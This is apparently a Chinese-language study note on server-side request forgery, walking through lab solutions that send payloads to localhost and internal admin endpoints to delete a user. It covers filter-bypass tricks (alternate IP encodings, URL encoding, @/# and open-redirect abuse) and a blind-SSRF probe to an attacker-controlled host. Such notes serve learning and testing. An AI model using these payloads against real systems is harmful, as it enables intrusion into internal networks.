# 是什么

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。


# 攻击者可以利用 SSRF 实现的攻击主要有 5 种：
1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息
2. 攻击运行在内网或本地的应用程序（比如溢出）
3. 对内网 WEB 应用进行指纹识别，通过访问默认文件实现
4. 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）
5. 利用 file 协议读取本地文件等

# 协议利用

[hacktricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)


# lab/

## Common SSRF attacks

1. Lab: Basic SSRF against the local server

把stockApi的参数替换为http://localhost/admin，遍历接口

![](SSRF(服务端请求伪造)_files/1.jpg)


下面payload删除carlos：

- http://localhost/admin/delete?username=carlos

2. Lab: Basic SSRF against another back-end system

探测IP

![](SSRF(服务端请求伪造)_files/1.jpg)

status=200的IP

![](SSRF(服务端请求伪造)_files/2.jpg)

soled

payload为：

- stockApi=http://192.168.0.46:8080/admin/delete?username=carlos

![](SSRF(服务端请求伪造)_files/3.jpg)


## Circumventing common SSRF defenses（绕过一般的 SSRF 防御系统）

- 使用 127.0.0.1 的其他 IP 表示法，例如 2130706433、017700000001 或 127.1。
- 注册解析到 127.0.0.1 的自己的域名。为此，您可以使用 spoofed.burpcollaborator.net。
- 使用 URL 编码或大小写变化混淆被拦截的字符串。
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.

1. Lab: SSRF with blacklist-based input filter

用```http://127.1/```代替```http://localhost/```
用```%2561```替换字母a绕过防护

![](SSRF(服务端请求伪造)_files/1.jpg)


###白名单绕过

- 使用@字符。如：https://expected-host:fakepassword@evil-host
- 使用#字符。如：https://evil-host#expected-host
- 利用 DNS 命名层次结构 ，如：https://expected-host.evil-host
- URL编码绕过
- 联合以上各种技术绕过

### 通过开放重定向绕过 SSRF 过滤器

如果参数中包含一个重定向的参数，也可以利用，比如：

- /product/nextProduct?currentProductId=6&path=http://evil-user.net
利用开放重定向漏洞来绕过 URL 过滤器，并利用 SSRF 漏洞如下

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

这个 SSRF 漏洞之所以能够工作，是因为应用程序首先验证提供的 stockAPI URL 是否位于允许的域上

2. Lab: SSRF with filter bypass via open redirection vulnerability

payload为：
```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

![](SSRF(服务端请求伪造)_files/1.jpg)


## Blind SSRF vulnerabilities(盲注SSRF)

向外部机器发http请求，看是否被访问验证ssrf存在

payload:
- http://<kali IP>:80/any

本地开一个python web服务监听，看有没有被访问


## Finding hidden attack surface for SSRF vulnerabilities（寻找隐藏的SSRF）

1. 某一可能被当做url的参数（有时，应用程序在请求参数中只输入主机名或 URL 路径的一部分。 提交的值随后会被服务器端整合到请求的完整 URL 中）
2. XML（有些应用程序传输数据时使用的格式规范允许包含数据解析器可能会请求的 URL）
3. Referer （有些应用程序使用服务器端分析软件来跟踪访问者。 这种软件通常会记录请求中的 Referer 标头，以便跟踪传入链接）

